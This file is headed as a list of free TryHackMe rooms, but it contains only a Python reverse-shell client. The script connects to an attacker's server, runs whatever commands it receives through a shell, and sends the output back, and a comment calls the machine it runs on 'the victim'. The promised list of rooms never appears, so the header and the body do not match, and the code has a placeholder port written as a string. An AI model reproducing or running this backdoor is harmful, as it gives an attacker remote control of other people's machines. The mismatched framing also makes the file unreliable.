#FreeTHM-Rooms
##This is the list of Free THM rooms available , Learn ,Enjoy  

############## [+] Client Flie [+] #################


import socket
import os
import subprocess

s = socket.socket()
host = 'Server IP'
port = 'give a port same as attacker'
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + ">"
        s.send(str.encode(output_str + currentWD))
        #print(output_str) #comment this string if u dont want output on the victim terminal
